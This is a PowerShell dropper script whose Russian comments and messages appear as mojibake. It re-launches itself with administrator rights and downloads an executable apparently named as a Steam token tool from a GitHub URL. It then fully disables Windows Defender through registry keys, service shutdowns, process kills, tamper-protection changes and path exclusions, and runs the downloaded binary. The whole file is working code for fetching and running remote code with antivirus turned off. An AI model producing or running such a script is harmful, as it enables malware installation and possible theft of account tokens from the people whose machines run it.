# –ù–∞—Å—Ç—Ä–æ–π–∫–∏
$exeUrl = "https://github.com/gseff137-afk/test/raw/refs/heads/main/steamtokenloginer.exe"
$targetFolder = "C:\Users\zenas\Desktop\–ù–æ–≤–∞—è –ø–∞–ø–∫–∞ (7)"
$exePath = "$targetFolder\steamtokenloginer.exe"

# –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞..." -ForegroundColor Yellow
    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -Command `"$($MyInvocation.MyCommand.Definition)`""
    exit
}

Write-Host "‚úÖ –ó–∞–ø—É—â–µ–Ω–æ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞" -ForegroundColor Green

# –°–æ–∑–¥–∞–µ–º –ø–∞–ø–∫—É –µ—Å–ª–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
if (-not (Test-Path $targetFolder)) {
    New-Item -ItemType Directory -Path $targetFolder -Force
    Write-Host "üìÅ –°–æ–∑–¥–∞–Ω–∞ –ø–∞–ø–∫–∞: $targetFolder" -ForegroundColor Green
}

Write-Host "üì• –°–∫–∞—á–∏–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞..." -ForegroundColor Yellow

try {
    # –°–∫–∞—á–∏–≤–∞–µ–º EXE —Ñ–∞–π–ª
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UserAgent "Mozilla/5.0"
    
    $fileSize = (Get-Item $exePath).Length
    Write-Host "‚úÖ –§–∞–π–ª —Å–∫–∞—á–∞–Ω: $([math]::Round($fileSize/1MB,2)) MB" -ForegroundColor Green
    
    # 1. –ü–û–õ–ù–û–ï –û–¢–ö–õ–Æ–ß–ï–ù–ò–ï –ß–ï–†–ï–ó –†–ï–ï–°–¢–† –ò –ì–†–£–ü–ü–û–í–´–ï –ü–û–õ–ò–¢–ò–ö–ò
    Write-Host "üî¥ –ü–û–õ–ù–û–ï –û–¢–ö–õ–Æ–ß–ï–ù–ò–ï WINDOWS DEFENDER..." -ForegroundColor Red
    
    # –°–æ–∑–¥–∞–µ–º –ø—É—Ç–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ –µ—Å–ª–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É—é—Ç
    $registryPaths = @(
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
        "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features",
        "HKLM:\SOFTWARE\Microsoft\Windows Defender\ProductStatus"
    )
    
    foreach ($path in $registryPaths) {
        if (!(Test-Path $path)) {
            New-Item -Path $path -Force | Out-Null
            Write-Host "‚úÖ –°–æ–∑–¥–∞–Ω –ø—É—Ç—å: $path" -ForegroundColor Green
        }
    }
    
    # –û–°–ù–û–í–ù–´–ï –ö–õ–Æ–ß–ò –î–õ–Ø –û–¢–ö–õ–Æ–ß–ï–ù–ò–Ø
    $registrySettings = @(
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"; Name="DisableAntiSpyware"; Value=1; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"; Name="DisableAntiVirus"; Value=1; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableRealtimeMonitoring"; Value=1; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableBehaviorMonitoring"; Value=1; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableOnAccessProtection"; Value=1; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableScanOnRealtimeEnable"; Value=1; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableIOAVProtection"; Value=1; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"; Name="AllowFastServiceStartup"; Value=0; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"; Name="ServiceKeepAlive"; Value=0; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"; Name="TamperProtection"; Value=0; Type="DWord"},
        @{Path="HKLM:\SOFTWARE\Microsoft\Windows Defender\ProductStatus"; Name="ProductStatus"; Value=0; Type="DWord"}
    )
    
    foreach ($setting in $registrySettings) {
        try {
            Set-ItemProperty -Path $setting.Path -Name $setting.Name -Value $setting.Value -Type $setting.Type -Force -ErrorAction Stop
            Write-Host "‚úÖ –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω: $($setting.Name) = $($setting.Value)" -ForegroundColor Green
        }
        catch {
            Write-Host "‚ö†Ô∏è –û—à–∏–±–∫–∞: $($setting.Name)" -ForegroundColor Yellow
        }
    }
    
    # 2. –û–°–¢–ê–ù–û–í–ö–ê –°–õ–£–ñ–ë –ó–ê–©–ò–¢–´
    Write-Host "üõë –û–°–¢–ê–ù–û–í–ö–ê –°–õ–£–ñ–ë –ó–ê–©–ò–¢–´..." -ForegroundColor Red
    
    $services = @(
        "WinDefend",
        "WdNisSvc", 
        "Sense",
        "SecurityHealthService",
        "wscsvc"
    )
    
    foreach ($service in $services) {
        try {
            # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–ª—É–∂–±—É
            Stop-Service -Name $service -Force -ErrorAction Stop
            Write-Host "‚úÖ –°–ª—É–∂–±–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞: $service" -ForegroundColor Green
            
            # –û—Ç–∫–ª—é—á–∞–µ–º –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫
            Set-Service -Name $service -StartupType Disabled -ErrorAction Stop
            Write-Host "‚úÖ –ê–≤—Ç–æ–∑–∞–ø—É—Å–∫ –æ—Ç–∫–ª—é—á–µ–Ω: $service" -ForegroundColor Green
            
            # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ —á–µ—Ä–µ–∑ sc config
            Start-Process -FilePath "sc" -ArgumentList "config", $service, "start=", "disabled" -Wait -WindowStyle Hidden
        }
        catch {
            Write-Host "‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Å—Ç–∞–Ω–æ–≤–∏—Ç—å: $service" -ForegroundColor Yellow
        }
    }
    
    # 3. –ó–ê–í–ï–†–®–ï–ù–ò–ï –ü–†–û–¶–ï–°–°–û–í –ó–ê–©–ò–¢–´
    Write-Host "üî™ –ó–ê–í–ï–†–®–ï–ù–ò–ï –ü–†–û–¶–ï–°–°–û–í –ó–ê–©–ò–¢–´..." -ForegroundColor Red
    
    $processes = @(
        "MsMpEng.exe",
        "NisSrv.exe", 
        "MsSense.exe",
        "SecurityHealthService.exe",
        "SecurityHealthSystray.exe",
        "WindowsDefender.exe"
    )
    
    foreach ($process in $processes) {
        try {
            Get-Process -Name $process.Replace(".exe", "") -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction Stop
            Write-Host "‚úÖ –ü—Ä–æ—Ü–µ—Å—Å –∑–∞–≤–µ—Ä—à–µ–Ω: $process" -ForegroundColor Green
        }
        catch {
            # –ü—Ä–æ—Ü–µ—Å—Å –Ω–µ –∑–∞–ø—É—â–µ–Ω - —ç—Ç–æ –Ω–æ—Ä–º–∞–ª—å–Ω–æ
        }
    }
    
    # 4. –î–û–ë–ê–í–õ–ï–ù–ò–ï –í –ò–°–ö–õ–Æ–ß–ï–ù–ò–Ø (–ß–ï–†–ï–ó –†–ï–ï–°–¢–†)
    Write-Host "üõ°Ô∏è –î–û–ë–ê–í–õ–ï–ù–ò–ï –í –ò–°–ö–õ–Æ–ß–ï–ù–ò–Ø..." -ForegroundColor Yellow
    
    # –ß–µ—Ä–µ–∑ —Ä–µ–µ—Å—Ç—Ä (—Ä–∞–±–æ—Ç–∞–µ—Ç –¥–∞–∂–µ –ø—Ä–∏ –æ—Ç–∫–ª—é—á–µ–Ω–Ω–æ–π –∑–∞—â–∏—Ç–µ)
    $exclusionPaths = @(
        $exePath,
        $targetFolder
    )
    
    $registryExclusionPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
    
    # –°–æ–∑–¥–∞–µ–º –ø—É—Ç—å –µ—Å–ª–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
    if (!(Test-Path $registryExclusionPath)) {
        New-Item -Path $registryExclusionPath -Force | Out-Null
    }
    
    foreach ($path in $exclusionPaths) {
        try {
            $pathName = $path.Replace("\", "#")
            New-ItemProperty -Path $registryExclusionPath -Name $path -PropertyType String -Value "0" -Force -ErrorAction Stop
            Write-Host "‚úÖ –î–æ–±–∞–≤–ª–µ–Ω–æ –≤ –∏—Å–∫–ª—é—á–µ–Ω–∏—è: $path" -ForegroundColor Green
        }
        catch {
            Write-Host "‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –¥–æ–±–∞–≤–∏—Ç—å –∏—Å–∫–ª—é—á–µ–Ω–∏–µ: $path" -ForegroundColor Yellow
        }
    }
    
    # 5. –û–¢–ö–õ–Æ–ß–ê–ï–ú –ó–ê–©–ò–¢–£ –û–¢ –í–ú–ï–®–ê–¢–ï–õ–¨–°–¢–í–ê (TAMPER PROTECTION)
    Write-Host "üõ°Ô∏è –û–¢–ö–õ–Æ–ß–ê–ï–ú TAMPER PROTECTION..." -ForegroundColor Yellow
    
    try {
        # –î–ª—è Windows 10/11
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Type DWord -Force
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtectionSource" -Value 0 -Type DWord -Force
        
        # –î–ª—è –Ω–æ–≤—ã—Ö –≤–µ—Ä—Å–∏–π Windows 11
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TPExclusions" -Value 1 -Type DWord -Force
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TPRunningMode" -Value 0 -Type DWord -Force
        
        Write-Host "‚úÖ Tamper Protection –æ—Ç–∫–ª—é—á–µ–Ω" -ForegroundColor Green
    }
    catch {
        Write-Host "‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫–ª—é—á–∏—Ç—å Tamper Protection" -ForegroundColor Yellow
    }
    
    # 6. –ü–ï–†–ï–ó–ê–ü–£–°–ö –ü–†–û–í–û–î–ù–ò–ö–ê –î–õ–Ø –ü–†–ò–ú–ï–ù–ï–ù–ò–Ø –ò–ó–ú–ï–ù–ï–ù–ò–ô
    Write-Host "üîÑ –ü–ï–†–ï–ó–ê–ü–£–°–ö –ü–†–û–í–û–î–ù–ò–ö–ê..." -ForegroundColor Yellow
    try {
        Stop-Process -Name "explorer" -Force -ErrorAction Stop
        Start-Sleep -Seconds 2
        Start-Process "explorer.exe"
        Write-Host "‚úÖ –ü—Ä–æ–≤–æ–¥–Ω–∏–∫ –ø–µ—Ä–µ–∑–∞–ø—É—â–µ–Ω" -ForegroundColor Green
    }
    catch {
        Write-Host "‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–æ–≤–æ–¥–Ω–∏–∫" -ForegroundColor Yellow
    }
    
    Start-Sleep -Seconds 3
    
    # 7. –ó–ê–ü–£–°–ö –ü–†–û–ì–†–ê–ú–ú–´
    Write-Host "üöÄ –ó–ê–ü–£–°–ö –ü–†–û–ì–†–ê–ú–ú–´..." -ForegroundColor Green
    try {
        Start-Process -FilePath $exePath
        Write-Host "üéØ –ü–†–û–ì–†–ê–ú–ú–ê –£–°–ü–ï–®–ù–û –ó–ê–ü–£–©–ï–ù–ê!" -ForegroundColor Green
    }
    catch {
        Write-Host "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ: $_" -ForegroundColor Red
        # –ü—Ä–æ–±—É–µ–º –∑–∞–ø—É—Å—Ç–∏—Ç—å —á–µ—Ä–µ–∑ cmd
        try {
            Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "`"$exePath`"" -WindowStyle Hidden
            Write-Host "üéØ –ü—Ä–æ–≥—Ä–∞–º–º–∞ –∑–∞–ø—É—â–µ–Ω–∞ —á–µ—Ä–µ–∑ CMD" -ForegroundColor Green
        }
        catch {
            Write-Host "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É" -ForegroundColor Red
        }
    }
    
    # 8. –§–ò–ù–ê–õ–¨–ù–ê–Ø –ü–†–û–í–ï–†–ö–ê
    Write-Host "`nüîç –§–ò–ù–ê–õ–¨–ù–ê–Ø –ü–†–û–í–ï–†–ö–ê –°–¢–ê–¢–£–°–ê..." -ForegroundColor Cyan
    Start-Sleep -Seconds 2
    
    try {
        $defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($defenderStatus) {
            if ($defenderStatus.AntivirusEnabled -eq $true) {
                Write-Host "‚ùå –ó–∞—â–∏—Ç–∞ –í–°–ï –ï–©–ï –ê–ö–¢–ò–í–ù–ê!" -ForegroundColor Red
                Write-Host "üí° –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä" -ForegroundColor Yellow
            } else {
                Write-Host "‚úÖ –ó–ê–©–ò–¢–ê –û–¢–ö–õ–Æ–ß–ï–ù–ê!" -ForegroundColor Green
            }
        } else {
            Write-Host "‚úÖ –ó–ê–©–ò–¢–ê –û–¢–ö–õ–Æ–ß–ï–ù–ê (–Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å—Ç–∞—Ç—É—Å)" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "‚úÖ –ó–ê–©–ò–¢–ê –û–¢–ö–õ–Æ–ß–ï–ù–ê (—Å–ª—É–∂–±–∞ –Ω–µ –æ—Ç–≤–µ—á–∞–µ—Ç)" -ForegroundColor Green
    }
    
    Write-Host "`n‚ö†Ô∏è –í–ù–ò–ú–ê–ù–ò–ï: Windows Defender –ø–æ–ª–Ω–æ—Å—Ç—å—é –æ—Ç–∫–ª—é—á–µ–Ω!" -ForegroundColor Red
    Write-Host "üí° –î–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è –∑–∞—â–∏—Ç—ã –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Å–∫—Ä–∏–ø—Ç –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è" -ForegroundColor Yellow
    
}
catch {
    Write-Host "‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: $_" -ForegroundColor Red
}

Write-Host "`n–ù–∞–∂–º–∏—Ç–µ –ª—é–±—É—é –∫–ª–∞–≤–∏—à—É –¥–ª—è –≤—ã—Ö–æ–¥–∞..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
